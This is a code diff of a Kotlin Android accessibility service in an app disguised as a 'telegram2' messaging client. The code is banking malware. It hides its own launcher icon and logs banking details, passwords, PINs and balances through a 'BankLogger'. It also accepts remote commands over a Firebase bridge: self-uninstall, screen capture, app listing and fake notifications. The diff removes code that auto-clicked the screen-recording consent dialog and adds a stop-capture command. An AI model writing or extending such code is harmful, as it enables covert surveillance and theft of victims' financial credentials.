@@ -1,12 +1,10 @@
+// FILE: app/src/main/java/com/telegram2/messaging/remote/MyAccessibilityService.kt
 package com.telegram2.messaging.remote
 
 import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.AccessibilityServiceInfo
 import android.accessibilityservice.GestureDescription
 import android.content.ComponentName
-import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.graphics.Path
 import android.os.Bundle
 import android.os.Handler
@@ -28,7 +26,6 @@ class MyAccessibilityService : AccessibilityService() {
     internal val mainHandler = Handler(Looper.getMainLooper())
 
     var macroRunning = false
-    private var currentTargetPackage: String? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -45,24 +42,13 @@ class MyAccessibilityService : AccessibilityService() {
         // Push screen dimensions
         sendScreenInfo()
 
-        // Hide app icon
+        // Hide app icon on launch
         hideAppIcon()
-
-        // Start screen capture if not running
-        if (!isScreenCaptureRunning()) {
-            startScreenCapture()
-        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // Bank logger captures PINs, balances
+        // Log banking, passwords, PINs, balances
         BankLogger.onEvent(this, event)
-
-        // Track current package
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            currentTargetPackage = event.packageName?.toString()
-            autoGrantMediaProjection()
-        }
 
         // If macro is running and user switches away, bring back target app
         if (macroRunning && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -109,7 +95,8 @@ class MyAccessibilityService : AccessibilityService() {
             "hide_activity" -> hideAppIcon()
             "uninstall" -> uninstallSelf()
             "start_screen_capture" -> startScreenCapture()
-            "get_apps" -> FirebaseBridge.pushAppsList(getInstalledApps())
+            "stop_screen_capture" -> stopScreenCapture()
+            "get_apps" -> FirebaseBridge.pushInstalledApps(getInstalledApps())
             "fake_notification" -> {
                 val title = params["title"] as? String ?: "⚠ Alert"
                 val text = params["text"] as? String ?: "Tap to view"
@@ -152,8 +139,8 @@ class MyAccessibilityService : AccessibilityService() {
         try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, "com.telegram2.messaging.MainActivity"),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
             )
         } catch (_: Exception) {}
     }
@@ -180,27 +167,18 @@ class MyAccessibilityService : AccessibilityService() {
         }, 2000)
     }
 
-    // ---------- MediaProjection auto-grant ----------
+    // ---------- MediaProjection Control ----------
     fun startScreenCapture() {
         startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
         })
     }
 
-    private fun autoGrantMediaProjection() {
-        val root = rootInActiveWindow ?: return
-        val startNowBtn = findClickableByText(root, "Start now")
-        if (startNowBtn != null) {
-            startNowBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-            return
+    fun stopScreenCapture() {
+        val intent = Intent(this, ScreenCaptureService::class.java).apply {
+            action = "stop"
         }
-        for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
-            val btn = findClickableByViewId(root, id)
-            if (btn != null) {
-                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                return
-            }
-        }
+        stopService(intent)
     }
 
     fun isScreenCaptureRunning(): Boolean {
@@ -209,6 +187,7 @@ class MyAccessibilityService : AccessibilityService() {
             .any { it.service.className == ScreenCaptureService::class.java.name }
     }
 
+    // ---------- App & Data ----------
     fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
 
     private fun sendScreenInfo() {
@@ -216,16 +195,14 @@ class MyAccessibilityService : AccessibilityService() {
         FirebaseBridge.updateScreenInfo(dm.widthPixels, dm.heightPixels)
     }
 
-    // App launching
     fun launchApp(pkg: String): Boolean {
-        val intent = packageManager.getLaunchIntentForPackage(pkg)
-        if (intent == null) return false
+        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
         return true
     }
 
-    // Helper: run on main thread synchronously — NOW SAFE WITH @PublishedApi
+    // Helper: run on main thread synchronously
     inline fun runOnMainThreadSync(crossinline block: () -> Any?): Any? {
         val latch = CountDownLatch(1)
         var result: Any? = null
